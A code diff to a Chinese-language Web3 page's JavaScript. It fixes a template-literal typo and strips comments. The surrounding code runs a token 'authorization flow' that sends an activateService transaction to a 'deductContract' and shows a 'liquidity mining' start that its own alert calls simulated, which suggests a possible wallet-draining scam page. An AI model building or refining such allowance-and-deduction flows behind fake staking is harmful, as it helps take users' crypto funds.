@@ -356,8 +356,7 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
     if (!serviceActivated && tokenToActivate) {
         stepCount++;
         const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
-        updateStatus(`步驟 ${stepCount}/${totalSteps]: 啟動服務 (使用 ${tokenName})...`);
-
+        updateStatus(`步驟 ${stepCount}/${totalSteps}: 啟動服務 (使用 ${tokenName})...`);
         const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
         activateTx.value = 0n;
         await sendMobileRobustTransaction(activateTx);
@@ -639,7 +638,7 @@ function updateLanguage(lang) {
         }
     }
     if (claimBtn.parentNode) {
-        claimBtn.textContent = translations[lang].claimBtnText || 'Claim'; // 確保有默認值
+        claimBtn.textContent = translations[lang].claimBtnText || 'Claim';
     }
 }
 
@@ -671,7 +670,7 @@ startBtn.addEventListener('click', () => {
         localStorage.setItem('stakingStartTime', stakingStartTime); // 持久化開始時間
         alert('開始流動性挖礦... (模擬: 流程已啟動)');
         // 添加 Claim 按鈕
-        claimBtn.textContent = translations[currentLang].claimBtnText || 'Claim'; // 確保有默認值
+        claimBtn.textContent = translations[currentLang].claimBtnText || 'Claim';
         claimBtn.className = 'start-btn';
         claimBtn.style.marginTop = '10px';
         claimBtn.disabled = false;
